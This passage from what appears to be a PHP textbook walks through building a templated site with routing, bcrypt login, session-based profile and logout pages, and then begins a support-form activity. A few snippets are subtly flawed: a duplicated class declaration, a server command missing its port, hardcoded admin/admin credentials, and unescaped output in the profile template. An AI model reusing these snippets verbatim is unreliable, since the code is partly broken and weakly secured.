			<p>This entry point is the only one that is exposed to the user's request. User requests are imported into web directory scripts so that no scripts can be directly accessed via the HTTP requests. This provides a security measure against malicious requests. </p>
			<p>In the preceding sections, we have described several best practices for building web applications. Let's put these into action to build an application in the following exercise.</p>
			<h2 id="_idParaDest-247"><a id="_idTextAnchor254"/>Exercise 6.10: Building an Application: The Home Page</h2>
			<p>In this exercise, you will build an application that follows good development practices in PHP, by structuring the application into separate components that will deal with specific tasks. More specifically, we will build a website with a single page – that is, the home page, where we will use HTML to structure and render the contents on the browser page; CSS to "beautify" the page contents; and, of course, PHP to process all the incoming requests and send the appropriate responses to the browser.</p>
			<p>Please ensure the currently running server is stopped and create a new directory, which will be used to build your first application. Everything that follows will consider the working directory as the one that was just created. In my case, I'll use the <strong class="source-inline">/app</strong> directory as the working directory, which you will notice later in the example. Here are the steps to perform the exercise:</p>
			<ol>
				<li value="1">Create the following directory structure and files:<div class="IMG---Figure" id="_idContainer165"><img alt="Figure 6.36: The directory structure of the application&#13;&#10;" src="image/C14196_06_36.jpg"/></div><p class="figure-caption">Figure 6.36: The directory structure of the application</p><p><strong class="bold">Where do we start?</strong></p><p>Just as is the case when using any tool or framework, let's start with the minimum requirements so that we can incrementally add more after that. Since we are deploying a web application, let's set up the base view; that is, the template that repeats on every page.</p></li>
				<li>Create a <strong class="source-inline">main.php</strong> template file.<p>In this file, we want to include the valid HTML template for a web page; therefore, we will include essential elements such as the <strong class="source-inline">doctype</strong> declaration; the HTML <strong class="source-inline">root</strong> tag; a <strong class="source-inline">head</strong> block with specific tags (for example, <strong class="source-inline">title</strong>), and a body block, in which we add a horizontal navigation bar with the website title (<strong class="source-inline">Learning PHP</strong>) and two links, <strong class="source-inline">Home</strong> (the <strong class="source-inline">/</strong> path) and <strong class="source-inline">Profile</strong> (the <strong class="source-inline">/profile</strong> path); and the main container where the output of other pages will be rendered. In this template file, we will look for the <strong class="source-inline">$title</strong> (<strong class="source-inline">echo($title ?? '(no title)');</strong>) and <strong class="source-inline">$content</strong> PHP variables and, if found, we will render them (<strong class="source-inline">if (isset($content)) echo $content;</strong>). This template will include the CSS styles of the Bootstrap CSS framework, which makes the website look prettier without any effort. We have chosen Bootstrap v4 for page display stylization, but there are plenty of alternatives that you should check out and choose the one that you think best suits you. Alternatives such as Foundation, Jeet, Pure, and Skeleton do a similar job to Bootstrap. Often, lightweight libraries are preferred over the heaps of utilities of larger frameworks such as Bootstrap.</p></li>
				<li>Input the following code to include the previously mentioned information: <p class="source-code-heading">main.php</p><p class="source-code">1 &lt;!doctype html&gt;</p><p class="source-code">2 &lt;html lang="en"&gt;</p><p class="source-code">3 &lt;head&gt;</p><p class="source-code">4     &lt;meta charset="utf-8"&gt;</p><p class="source-code">5     &lt;meta name="viewport" content="width=device-width, initial-scale=1,        shrink-to-fit=no"&gt;</p><p class="source-code">6     &lt;title&gt;&lt;?php echo($title ?? '(no title)'); ?&gt;&lt;/title&gt;</p><p class="source-code">7     &lt;link href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/        bootstrap.min.css" rel="stylesheet"&gt;</p><p class="source-code">8 &lt;/head&gt;</p><p class="source-code-link"><a href="https://packt.live/2Nfdqad">https://packt.live/2Nfdqad</a></p><p>The <strong class="source-inline">main.php</strong> template has the website HTML skeleton that will be rendered on every page. </p><p>Now, to render this file accordingly, we need a component that will load the template file, create the expected variables (when provided), and then create the plain HTML input ready to display on the browser. We will use the <strong class="source-inline">\Components\Template</strong> class (that is, the <strong class="source-inline">src/components/Template.php</strong> file) for this purpose. A common feature for each template is the directory where they are stored, so we may want to save this parameter in a static variable.</p></li>
				<li>Save the directory in which the templates are stored in a static <strong class="source-inline">$viewsPath</strong> variable:<p class="source-code">public static $viewsPath = __DIR__ . '/../templates';</p></li>
				<li>The complete path for a template file is unique to each template. Hence, we would like each template to contain its own required <strong class="source-inline">path</strong> property. Here is the code to do this:<p class="source-code">private $name;</p><p class="source-code">public function __construct(string $name)</p><p class="source-code">{</p><p class="source-code">    $this-&gt;name = $name;</p><p class="source-code">}</p><p class="source-code">private function getFilepath(): string</p><p class="source-code">{</p><p class="source-code">    return self::$viewsPath . DIRECTORY_SEPARATOR . $this-&gt;name . '.php';</p><p class="source-code">}</p><p class="callout-heading">Note </p><p class="callout">Since all the presentation files contain the <strong class="source-inline">.php</strong> extension, we will not include it in the name path; in this case, a <strong class="source-inline">\Components\Template</strong> with the name <strong class="source-inline">main</strong> will automatically append "<strong class="source-inline">.php</strong>" to the template name and will resolve the <strong class="source-inline">src/templates/main.php</strong> file.</p></li>
				<li>Render the template content using the provided associative array data.<p>We have the views path and the template name, and now we need a method (let's call it <strong class="source-inline">render()</strong>) to render the file, importing the variables. We will use the built-in <strong class="source-inline">extract()</strong> function to import the variables into the current symbol table from the data array (<strong class="source-inline">extract($data, EXTR_OVERWRITE);</strong>). This means that if <strong class="source-inline">$data = ['name' =&gt; 'John'];</strong>, the <strong class="source-inline">extract()</strong> function will import the <strong class="source-inline">$name</strong> variable that will have the value <strong class="source-inline">John</strong>. Then, we include the template file to render the content and, since we don't want to output to the user just yet (we only want to render the template), we will catch the output using the <strong class="source-inline">ob_start()</strong> and <strong class="source-inline">ob_get_clean()</strong> output control functions to start the output buffering, get the contents, and clean the current buffer. The rendered content is then returned by the method:</p><p class="source-code">function render(array $data = []): string</p><p class="source-code">{</p><p class="source-code">    extract($data, EXTR_OVERWRITE);</p><p class="source-code">    ob_start();</p><p class="source-code">    require $this-&gt;getFilepath();</p><p class="source-code">    $rendered = ob_get_clean();</p><p class="source-code">    return (string)$rendered;</p><p class="source-code">}</p><p class="callout-heading">Note</p><p class="callout">The final script in <strong class="source-inline">Template.php</strong> can be referred here <a href="https://packt.live/35D34t9">https://packt.live/35D34t9</a>.</p></li>
				<li>Let's see whether we can get an output in the browser now. Since <strong class="source-inline">index.php</strong> is the only file that is accessed through the web server, let's open and add the requirements to print the first HTML page. First, we want to include the templates component and instantiate the <strong class="source-inline">main</strong> template:<p class="source-code">require_once __DIR__ . '/../src/components/Template.php';</p><p class="source-code">$mainTemplate = new \Components\Template('main');</p><p>We will put a website title in the <strong class="source-inline">$templateData</strong> associative array, and we will use this to invoke the <strong class="source-inline">render()</strong> method of the template instance, so that the <strong class="source-inline">title</strong> entry in the associative array will become the <strong class="source-inline">$title</strong> variable in the <strong class="source-inline">main.php</strong> file:</p><p class="source-code">$templateData = [</p><p class="source-code">    'title' =&gt; 'My main template',</p><p class="source-code">];</p><p class="source-code">echo $mainTemplate-&gt;render($templateData);</p></li>
				<li>Start the PHP built-in web server in the <strong class="source-inline">./web</strong> directory, <strong class="source-inline">php -S 127.0.0.1</strong>, and access the home page at <strong class="source-inline">http://127.0.0.1:8080/</strong>.<p>The output should look like this:</p></li>
			</ol>
			<div>
				<div class="IMG---Figure" id="_idContainer166">
					<img alt="Figure 6.37: The home page&#13;&#10;" src="image/C14196_06_37.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.37: The home page</p>
			<p>Accessing the server document root without a specific filename will make the PHP built-in server automatically look for the <strong class="source-inline">index.php</strong> file (so accessing <strong class="source-inline">http://127.0.0.1:8080/</strong> is identical to<strong class="source-inline"> http://127.0.0.1:8080/index.php</strong>). A similar configuration is done on production setups for different servers, such as NGINX and Apache. At this stage, clicking on any link will always make the main template be displayed.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">The <strong class="source-inline">/app </strong>directory that can be seen in the preceding figure is the directory where I put the <strong class="source-inline">src</strong> and <strong class="source-inline">web</strong> directories.</p>
			<p>Right now, clicking on the <strong class="source-inline">Profile</strong> button (that is, the <strong class="source-inline">/profile</strong> URI path) will make the same template render. Actually, any URI path would make the same <strong class="source-inline">main</strong> template render. Now, we may want to add some logic and print a different template for our Profile page. To do this, we should provide <strong class="source-inline">content</strong> data in the associative array we pass to the <strong class="source-inline">\Components\Template::render()</strong> method. As a recap, the <strong class="source-inline">\Components\Template::render()</strong> method will import the <strong class="source-inline">content</strong> array key and will make it available as a <strong class="source-inline">$content</strong> variable, which will be rendered in the <strong class="source-inline">main</strong> template (remember the <strong class="source-inline">if (isset($content)) { echo $content; }</strong> part in the <strong class="source-inline">main</strong> template).</p>
			<p>It makes sense to return specific template content for each URI path (by checking the <strong class="source-inline">$_SERVER['PATH_INFO']</strong> value) and, since the pages returned often include dynamic or changing content, we need a <em class="italic">place</em> to process all the data we provide to the <strong class="source-inline">\Components\Template::render()</strong> method. For this purpose, we will use the request handlers; that is, the classes stored in the files of the <strong class="source-inline">src/handlers/</strong> directory. To recap, for each request, the script has to assign a handler class for a URI path, while the handler class is responsible for processing the request and returning content to the <strong class="source-inline">main</strong> template (you can do this by using the <strong class="source-inline">Template</strong> component or by just returning the string right away).</p>
			<p>In the previous exercise, we built the home page of our application. Now we will continue building our application in the next exercise.</p>
			<h2 id="_idParaDest-248"><a id="_idTextAnchor255"/>Exercise 6.11: Building an Application: The Profile Page and the Login Form</h2>
			<p>In this exercise, we will set up the handler's common functionality and create the abstract class, <strong class="source-inline">\Handlers\Handler</strong>, which will be extended by actual handlers. We declare it as abstract since we don't want it to be instantiated, but rather extended instead. Its purpose is to define some common functionality, such as returning the page title or setting a redirect request for an HTTP response, but also to require each handler class to implement the method responsible for request handling – we will simply call it <strong class="source-inline">handle()</strong>.</p>
			<ol>
				<li value="1">Save the <strong class="source-inline">src/handlers/Handler.php</strong> file content, which should look like this:<p class="source-code-heading">Handler.php</p><p class="source-code">1  &lt;?php</p><p class="source-code">2  declare(strict_types=1);</p><p class="source-code">3  </p><p class="source-code">4  namespace Handlers;</p><p class="source-code">5  </p><p class="source-code">6  abstract class Handler</p><p class="source-code">7  abstract class Handler</p><p class="source-code">8  {</p><p class="source-code">9      private $redirectUri = '';</p><p class="source-code">10     abstract public function handle(): string;</p><p class="source-code">11</p><p class="source-code">12     public function getTitle(): string</p><p class="source-code">13     {</p><p class="source-code">14         return 'Learning PHP';</p><p class="source-code">15     }</p><p class="source-code-link"><a href="https://packt.live/2PahU4c">https://packt.live/2PahU4c</a></p></li>
				<li>To access the Profile page, we need an authenticated user; therefore, let's build the login form and authentication logic. Add the following code to the <strong class="source-inline">Login</strong> handler:<p class="source-code">&lt;?php</p><p class="source-code">declare(strict_types=1);</p><p class="source-code">namespace Handlers;</p><p class="source-code">class Login extends Handler</p><p class="source-code">{</p><p class="source-code">    public function handle(): string</p><p class="source-code">    {</p><p class="source-code">        return (new \Components\Template('login-form'))-&gt;render();</p><p class="source-code">    }</p><p class="source-code">}</p><p>What the <strong class="source-inline">\Handlers\Login</strong> handler does is implement the <strong class="source-inline">handle()</strong> method, which is a requirement since it extends the <strong class="source-inline">Handlers\Handler</strong> abstract class. In the <strong class="source-inline">handle()</strong> method, we return the rendered "l<strong class="source-inline">ogin-form</strong>" template.</p></li>
				<li>The "<strong class="source-inline">login-form</strong>" template, as the name suggests, will contain the HTML markup for the login form. What we want here is a form title, such as "<strong class="source-inline">Authentication</strong>", the "<strong class="source-inline">username</strong>" and "<strong class="source-inline">password</strong>" inputs and their labels, and the submit button. Since the credentials are not meant to appear in the address bar of the browser, the form method we choose is <strong class="source-inline">POST</strong>. If the form is submitted but data validation fails for some reason, the previously entered username will be displayed automatically in the <strong class="source-inline">username</strong> field <strong class="source-inline">(&lt;?= htmlentities($formUsername ?? '') ?&gt;</strong>). Additionally, when the authentication fails, the reason will be rendered under the specific field, inside a <strong class="source-inline">div</strong> element with the <strong class="source-inline">invalid-feedback</strong> CSS class. <p>Let's save the <strong class="source-inline">login-form</strong> template to the <strong class="source-inline">src/templates/login-form.php</strong> file:</p><p class="source-code-heading">login-form.php</p><p class="source-code">1 &lt;div class="d-flex justify-content-center"&gt;</p><p class="source-code">2     &lt;form method="post" action="/login" style="width: 100%;         max-width: 420px;"&gt;</p><p class="source-code">3         &lt;div class="text-center mb-4"&gt;</p><p class="source-code">4             &lt;h1 class="h3 mb-3 font-weight-normal"&gt;Authenticate&lt;/h1&gt;</p><p class="source-code">5             &lt;p&gt;Use &lt;code&gt;admin&lt;/code&gt; for both username and password.&lt;/p&gt;</p><p class="source-code">6         &lt;/div&gt;</p><p class="source-code-link"><a href="https://packt.live/2MA0dtk">https://packt.live/2MA0dtk</a></p><p>Notice that we use <strong class="source-inline">htmlentities()</strong> to escape the output from variables containing random, dynamic data, such as user input.</p></li>
				<li>We have the <strong class="source-inline">Login</strong> handler and the <strong class="source-inline">login-form</strong> template already. What we need now is to run that handler for the <strong class="source-inline">/login</strong> path. Since we will have to add more rules like this (for example, running the <strong class="source-inline">Profile</strong> handler for the <strong class="source-inline">/profile</strong> path), it makes sense to group this functionality into a specific component. We will use the <strong class="source-inline">\Components\Router</strong> component for this purpose. What this <strong class="source-inline">Router</strong> component will do exactly is route the incoming requests to specific handlers based in the URI path (the <strong class="source-inline">$_SERVER['PATH_INFO']</strong> value). This can be simply achieved by using a <strong class="source-inline">switch</strong> statement. All this logic will be put in the only class method called <strong class="source-inline">getHandler()</strong>:<p class="source-code">// src/components/Router.php</p><p class="source-code">public function getHandler(): ?Handler</p><p class="source-code">{</p><p class="source-code">    switch ($_SERVER['PATH_INFO'] ?? '/') {</p><p class="source-code">        case '/login':</p><p class="source-code">            return new Login();</p><p class="source-code">        default:</p><p class="source-code">            return null;</p><p class="source-code">    }</p><p class="source-code">}</p></li>
				<li>Now we can use the router instance in the <strong class="source-inline">index.php</strong> file (the application entry point) to get a request handler or <strong class="source-inline">null</strong> for the current request. When a non-null value is returned, we can process the request with the <strong class="source-inline">Handlers\Handler::handle()</strong> method, check for the redirect request, get the page title, and set the appropriate data (that is, content and title) for the <strong class="source-inline">main</strong> template:<p class="source-code">// web/index.php</p><p class="source-code">$router = new \Components\Router();</p><p class="source-code">if ($handler = $router-&gt;getHandler()) {</p><p class="source-code">    $content = $handler-&gt;handle();</p><p class="source-code">    if ($handler-&gt;willRedirect()) {</p><p class="source-code">        return;</p><p class="source-code">    }</p><p class="source-code">    $templateData['content'] = $content;</p><p class="source-code">    $templateData['title'] = $handler-&gt;getTitle();</p><p class="source-code">}</p></li>
				<li>Now, when someone enters a URI with a path that is not listed in the <strong class="source-inline">switch</strong> statement of the <strong class="source-inline">\Components\Router::getHandler()</strong> method (usually because of a typo), it will make the method return <strong class="source-inline">null</strong>, which will cause the <strong class="source-inline">main</strong> template to render with the default content (the <strong class="source-inline">Hello world</strong> block). We should not allow such behavior, since our website pages are indexed by search engines and are marked as duplicated content. We may want to display a <strong class="source-inline">404 - Not found</strong> error page, or redirect to an existing page, such as the home page. We will choose to redirect to the home page using the <strong class="source-inline">/</strong> path:<p class="source-code-heading">Router.php</p><p class="source-code">12 public function getHandler(): ?Handler</p><p class="source-code">13 {</p><p class="source-code">14     switch ($_SERVER['PATH_INFO'] ?? '/') {</p><p class="source-code">15         case '/login':</p><p class="source-code">16             return new Login();</p><p class="source-code">17         case '/':</p><p class="source-code">18             return null;</p><p class="source-code">19         default:</p><p class="source-code">20             return new class extends Handler</p><p class="source-code">21             {</p><p class="source-code">22                 public function handle(): string</p><p class="source-code">23                 {</p><p class="source-code">24                     $this-&gt;requestRedirect('/');</p><p class="source-code">25                     return '';</p><p class="source-code">26                 }</p><p class="source-code-link"><a href="https://packt.live/32F56qK">https://packt.live/32F56qK</a></p><p class="callout-heading">Note </p><p class="callout">Instead of creating a new handler class for the <strong class="source-inline">default</strong> case, we may prefer to use an anonymous class instead, since the <strong class="source-inline">handle()</strong> method logic is not large and it is less likely to grow in future.</p><p>The content of <strong class="source-inline">src/components/Router.php</strong> will be the following:</p><p class="source-code-heading">Router.php</p><p class="source-code">1 &lt;?php declare(strict_types=1);</p><p class="source-code">2 </p><p class="source-code">3 namespace Components;</p><p class="source-code">4 </p><p class="source-code">5 use Handlers\Handler;</p><p class="source-code">6 use Handlers\Login;</p><p class="source-code">7 use Handlers\Logout;</p><p class="source-code">8 use Handlers\Profile;</p><p class="source-code-link"><a href="https://packt.live/35Ycxem">https://packt.live/35Ycxem</a></p></li>
				<li>While <strong class="source-inline">web/index.php</strong> will become the following:<p class="source-code">&lt;?php</p><p class="source-code">declare(strict_types=1);</p><p class="source-code">require_once __DIR__ . '/../src/components/Template.php';</p><p class="source-code">require_once __DIR__ . '/../src/components/Router.php';</p><p class="source-code">require_once __DIR__ . '/../src/handlers/Handler.php';</p><p class="source-code">require_once __DIR__ . '/../src/handlers/Login.php';</p><p class="source-code">$mainTemplate = new \Components\Template('main');</p><p class="source-code">$templateData = [</p><p class="source-code">    'title' =&gt; 'My main template',</p><p class="source-code">];</p><p class="source-code">$router = new \Components\Router();</p><p class="source-code">if ($handler = $router-&gt;getHandler()) {</p><p class="source-code">    $content = $handler-&gt;handle();</p><p class="source-code">    if ($handler-&gt;willRedirect()) {</p><p class="source-code">        return;</p><p class="source-code">    }</p><p class="source-code">    $templateData['content'] = $content;</p><p class="source-code">    $templateData['title'] = $handler-&gt;getTitle();</p><p class="source-code">}</p><p class="source-code">echo $mainTemplate-&gt;render($templateData);</p></li>
				<li>Let's take a look at what we have so far. Access the <strong class="source-inline">http://127.0.0.1:8080/login</strong> URL in your browser; the output should look like this:<div class="IMG---Figure" id="_idContainer167"><img alt="Figure 6.38: Login page&#13;&#10;" src="image/C14196_06_38.jpg"/></div><p class="figure-caption">Figure 6.38: Login page</p><p>Here, we have a nice-looking login form, but so far without any functionality. Let's add some in the <strong class="source-inline">\Handlers\Login</strong> handler class.</p></li>
				<li>First, we need to store a username and a password, and since we will learn about data persistence in the next chapter, let's define these values directly in the PHP script:<p class="source-code">$username = 'admin';</p><p class="source-code">$passwordHash = '$2y$10$Y09UvSz2tQCw/454Mcuzzuo8ARAjzAGGf8OPGeBloO7j47Fb2v.  lu'; // "admin" password hash</p><p>Note that we do not store the password in plain text for security reasons, and no one should ever do so. Additionally, a good approach is to avoid adding password hashes to <strong class="bold">Version Control Systems </strong>(<strong class="bold">VCSes</strong>) and use a configuration file instead (a distributable configuration file may be added to a VCS, containing configuration defaults or empty values).</p><p class="callout-heading">Note </p><p class="callout">A common password hashing algorithm that is used nowadays is Bcrypt, and the password hashing function used in PHP is <strong class="source-inline">password_hash()</strong>, which requires the password string as the first parameter and the hashing algorithm as the integer for the second parameter. The salt is generated automatically by the <strong class="source-inline">password_hash()</strong> function and is used to obtain the password hash using the <strong class="source-inline">bcrypt</strong> algorithm. Instantly obtaining a password hash with PHP is as simple as running a short inline code in Terminal: <strong class="source-inline">php -r "echo password_hash('admin', PASSWORD_BCRYPT), PHP_EOL;"</strong>.</p></li>
				<li>In the case of the <strong class="source-inline">POST</strong> request, we have to validate the login attempt; therefore, we should perform username and password matching. The errors, if there is a username or password mismatch, will be added to the <strong class="source-inline">$formError</strong> associative array under the <strong class="source-inline">username</strong> key (in the case of a username mismatch), and under the <strong class="source-inline">password</strong> key (in the case of password mismatch). To verify password matching, we will use the <strong class="source-inline">password_verify()</strong> built-in function, which requires the plain text password as the first argument, and the password hash as the second argument; it returns <strong class="source-inline">TRUE</strong> if there is a match, and <strong class="source-inline">FALSE</strong> otherwise:<p class="source-code">$formUsername = $_POST['username'] ?? '';</p><p class="source-code">$formPassword = $_POST['password'] ?? '';</p><p class="source-code">if ($formUsername !== $username) {</p><p class="source-code">    $formError = ['username' =&gt; sprintf('The username [%s] was not       found.', $formUsername)];</p><p class="source-code">} elseif (!password_verify($formPassword, $passwordHash)) {</p><p class="source-code">    $formError = ['password' =&gt; 'The provided password is invalid.'];</p><p class="source-code">}</p></li>
				<li>The form errors and the form-submitted username will be sent to the template in the <strong class="source-inline">render()</strong> method:<p class="source-code">return (new \Components\Template('login-form'))-&gt;render([</p><p class="source-code">    'formError' =&gt; $formError,</p><p class="source-code">    'formUsername' =&gt; $formUsername ?? ''</p><p class="source-code">]);</p></li>
				<li>If the username and password matches, then add the username and login time in the session data, and then perform a redirect to the Profile page:<p class="source-code">$_SESSION['username'] = $username;</p><p class="source-code">$_SESSION['loginTime'] = date(\DATE_COOKIE);</p><p class="source-code">$this-&gt;requestRedirect('/profile');</p><p class="callout-heading">Note </p><p class="callout">In order to use the <strong class="source-inline">$_SESSION</strong> superglobal, the session must be started first, so we have to do it somewhere on a higher level, since we may need to use the session data in other places of the application, not only in the <strong class="source-inline">Login</strong> handler. We will add <strong class="source-inline">session_start();</strong> in the <strong class="source-inline">web/index.php</strong> file, after the <strong class="source-inline">require_once</strong> statements list.</p></li>
				<li>We may also check, at the very beginning of the <strong class="source-inline">\Handlers\Login::handle()</strong> method, whether the session username is already set (that is, whether an authentication was already performed) to prevent the login form displaying another login attempt taking place, and, if so, perform a redirect to the home page:<p class="source-code">if (isset($_SESSION['username'])) {</p><p class="source-code">    $this-&gt;requestRedirect('/');</p><p class="source-code">    return '';</p><p class="source-code">}</p><p class="callout-heading">Note</p><p class="callout">At this point, we have completed the <strong class="source-inline">Login</strong> handler logic, and the content can be referred at <a href="https://packt.live/2OJ9KzA">https://packt.live/2OJ9KzA</a>.</p></li>
				<li>We now have the login form and authentication functionality in place; let's proceed by adding the protected Profile page. Since only the authenticated users are allowed to access this page, we will check for the <strong class="source-inline">username</strong> entry in the session data. When no user is authenticated, we will display the Login form (to perform this in the <strong class="source-inline">\Handlers\Profile</strong> handler):<p class="source-code">if (!array_key_exists('username', $_SESSION)) {</p><p class="source-code">    return (new Login)-&gt;handle();</p><p class="source-code">}</p><p>In other words, the <strong class="source-inline">/login</strong> page will be rendered in the <strong class="source-inline">/profile</strong> page when the user is not authenticated.</p><p class="callout-heading">Note</p><p class="callout">Checking for the "<strong class="source-inline">username</strong>" entry in the session data, in this example, is our way of telling whether a user is logged in or not, which is not as secure and useful as it could be. Nowadays, using an open source solution to handle authentication is a much better alternative, since the session login data contains more information, such as login method, time, hashing algorithm, token, lifetime, and other potentially useful data that is used to validate the authentication.</p></li>
				<li>Otherwise, if we have an authenticated user, we will render and return the <strong class="source-inline">profile</strong> template, providing the username and session data to the template's <strong class="source-inline">render()</strong> method:<p class="source-code">return (new \Components\Template('profile'))-&gt;render([</p><p class="source-code">    'username' =&gt; $_SESSION['username'],</p><p class="source-code">    'sessionData' =&gt; var_export($_SESSION, true)</p><p class="source-code">]);</p></li>
				<li>Additionally, let's add the Profile page title by extending the <strong class="source-inline">getTitle()</strong> method from the parent class. The new title will include the word Profile prepended to the default title, which is provided by the parent class:<p class="source-code">public function getTitle(): string</p><p class="source-code">{</p><p class="source-code">    return 'Profile - ' . parent::getTitle();</p><p class="source-code">}</p></li>
				<li>Save the <strong class="source-inline">src/handlers/Profile.php</strong> file; the full content should be as follows:<p class="source-code-heading">Profile.php</p><p class="source-code">1  &lt;?php</p><p class="source-code">2  declare(strict_types=1);</p><p class="source-code">3</p><p class="source-code">4  namespace Handlers;</p><p class="source-code">5</p><p class="source-code">6  class Profile extends Handler</p><p class="source-code">7  {</p><p class="source-code">8      public function handle(): string</p><p class="source-code">9      {</p><p class="source-code">10         if (!array_key_exists('username', $_SESSION)) {</p><p class="source-code">11             return (new Login)-&gt;handle();</p><p class="source-code">12         }</p><p class="source-code-link"><a href="https://packt.live/2MzC06l">https://packt.live/2MzC06l</a></p></li>
				<li>The <strong class="source-inline">profile</strong> template will only display the username and the session data that were provided as variables, plus the <strong class="bold">Logout</strong> link with the <strong class="source-inline">/logout</strong> value for the <strong class="source-inline">href</strong> attribute:<p class="source-code">&lt;section class="my-5"&gt;</p><p class="source-code">    &lt;h4&gt;Welcome, &lt;?= $username ?&gt;!&lt;/h4&gt;</p><p class="source-code">&lt;/section&gt;</p><p class="source-code">&lt;p&gt;Session data: &lt;/p&gt;</p><p class="source-code">&lt;pre&gt;&lt;code&gt;&lt;?= $sessionData ?&gt;&lt;/code&gt;&lt;/pre&gt;</p><p class="source-code">&lt;hr class="my-5"&gt;</p><p class="source-code">&lt;p&gt;&lt;a href="/logout"&gt;Logout&lt;/a&gt;&lt;/p&gt;</p></li>
				<li>The <strong class="source-inline">Logout</strong> handler will regenerate the session ID and will destroy the current session's data. Additionally, a redirect on the website home page will be requested:<p class="source-code">&lt;?php</p><p class="source-code">declare(strict_types=1);</p><p class="source-code">namespace Handlers;</p><p class="source-code">class Logout extends Handler</p><p class="source-code">{</p><p class="source-code">    public function handle(): string</p><p class="source-code">    {</p><p class="source-code">        session_regenerate_id(true);</p><p class="source-code">        session_destroy();</p><p class="source-code">        $this-&gt;requestRedirect('/');</p><p class="source-code">        return '';</p><p class="source-code">    }</p><p class="source-code">}</p></li>
				<li>We need to add the <strong class="source-inline">Profile</strong> and <strong class="source-inline">Logout</strong> handlers in the <strong class="source-inline">Router</strong> component:<p class="source-code-heading">Router.php</p><p class="source-code">1  &lt;?php</p><p class="source-code">2  declare(strict_types=1);</p><p class="source-code">3</p><p class="source-code">4  namespace Components;</p><p class="source-code">5</p><p class="source-code">6  use Handlers\Handler;</p><p class="source-code">7  use Handlers\Login;</p><p class="source-code">8  use Handlers\Logout;</p><p class="source-code">9  use Handlers\Profile;</p><p class="source-code">10 </p><p class="source-code">11 class Router</p><p class="source-code-link"><a href="https://packt.live/2BAGrYp">https://packt.live/2BAGrYp</a></p></li>
				<li>Additionally, the <strong class="source-inline">src/handlers/Logout.php</strong> and <strong class="source-inline">src/handlers/Profile.php</strong> files should be required in <strong class="source-inline">web/index.php</strong>:<p class="source-code-heading">index.php</p><p class="source-code">1  &lt;?php</p><p class="source-code">2  declare(strict_types=1);</p><p class="source-code">3</p><p class="source-code">4  require_once __DIR__ . '/../src/components/Template.php';</p><p class="source-code">5  require_once __DIR__ . '/../src/components/Router.php';</p><p class="source-code">6  require_once __DIR__ . '/../src/handlers/Handler.php';</p><p class="source-code">7  require_once __DIR__ . '/../src/handlers/Login.php';</p><p class="source-code">8  require_once __DIR__ . '/../src/handlers/Logout.php';</p><p class="source-code">9  require_once __DIR__ . '/../src/handlers/Profile.php';</p><p class="source-code">10 session_start();</p><p class="source-code">11 </p><p class="source-code">12 $mainTemplate = new \Components\Template('main');</p><p class="source-code">13 $templateData = [</p><p class="source-code">14     'title' =&gt; 'My main template',</p><p class="source-code">15 ];</p><p class="source-code-link"><a href="https://packt.live/35XZg5O">https://packt.live/35XZg5O</a>8</p><p class="callout-heading">Note </p><p class="callout">Using a tool such as <strong class="source-inline">composer</strong> for the autoload feature, or any other implementation of "<strong class="source-inline">PSR-4: Autoloader</strong>", would make it much easier to deal with loading code. Using <strong class="source-inline">composer</strong> will be covered in <em class="italic">Chapter 9</em>, <em class="italic">Composer</em>.</p></li>
				<li>Everything seems to be done; let's take a look at how the website works. Click on the <strong class="source-inline">Profile</strong> link from the header. The output should look like this:<div class="IMG---Figure" id="_idContainer168"><img alt="Figure 6.39: The Profile page, displaying the login form for unauthenticated users&#13;&#10;" src="image/C14196_06_39.jpg"/></div><p class="figure-caption">Figure 6.39: The Profile page, displaying the login form for unauthenticated users</p></li>
				<li>Enter <strong class="source-inline">admin</strong> for both the username and password and click on the <strong class="source-inline">Login</strong> button. You should now be able to access the Profile page:<div class="IMG---Figure" id="_idContainer169"><img alt="" src="image/C14196_06_40.jpg"/></div><p class="figure-caption">Figure 6.40: The Profile page, displaying the login information for the authenticated user</p><p>Click on <strong class="source-inline">Home</strong>, then back on <strong class="source-inline">Profile</strong>, and refresh the page. You will notice that the session is not lost between requests.</p></li>
				<li>Click on the <strong class="source-inline">Logout</strong> link from the Profile page. You should be redirected to the Home page. Accessing the Profile page again will result in the Login form display, as shown in <em class="italic">Figure 6.39</em>.</li>
			</ol>
			<p>Congratulations! You have just built your first website, and that's just the beginning. In this exercise, you have split the code according to its purpose, you have used security measures such as input validation and output escaping, and you have made the application respond appropriately to any HTTP request.</p>
			<h2 id="_idParaDest-249">Activity 6.1: Creating a Support Contact<a id="_idTextAnchor256"/> Form</h2>
			<p>You are asked to implement a <strong class="bold">Support Contact Form</strong> on a new brand website. The form will be available for authenticated users only, on the Profile page, and the authentication part is in your charge as well. There will be two types of users: standard and VIP level. The standard users will be able to ask for support once per day, while the VIP users will have no limit. The form will contain the following fields: the name and the email where the replies should be sent to and the message. The form data should be sanitized and validated before it is registered. The rules are as follows: all required fields should be filled, use a valid email address, and the message should not be shorter than 40 characters.</p>
			<p>The basic page layout should look like this:</p>
			<div>
				<div class="IMG---Figure" id="_idContainer170">
					<img alt="Figure 6.41: The expected page layout&#13;&#10;" src="image/C14196_06_41.jpg"/>
				</div>
			</div>
			<p class="figure-caption">Figure 6.41: The expected page layout</p>
			<p>Given this data, let's proceed. Since the functionality and some of the layout are very similar to the previous exercise, let's use that code as a starting point while adjusting and adding to it according to our specifications. You can copy the code from the previous exercise to another directory to keep a copy of the exercise solution and continue the work in the current directory, where the built-in server is already started. For the record, my current working directory is <strong class="source-inline">/app</strong>.</p>
			<p class="callout-heading">Note</p>
			<p class="callout">Before we start, make sure to log out of your current session by accessing the <strong class="source-inline">http://127.0.0.1:8080/logout</strong> URL in your browser.</p>
			<p>Here are the steps to perform the activity:</p>
			<ol>
				<li value="1">Write the code to fetch the user data for the username that is logged in.</li>
				<li>Implement the <strong class="source-inline">\Handlers\Login::handle()</strong> method to validate the user credentials.</li>
				<li>Create a login form. You can use the code from the previous exercise; however, make sure you delete the hint for the credentials (such as the username and password for admin).</li>
				<li>Create the profile page. Here, you should build the <strong class="source-inline">src/templates/profile.php</strong> file from scratch. First, add the greetings and a logout button. </li>
				<li>Add a support area and divide it into two equal horizontal parts.</li>
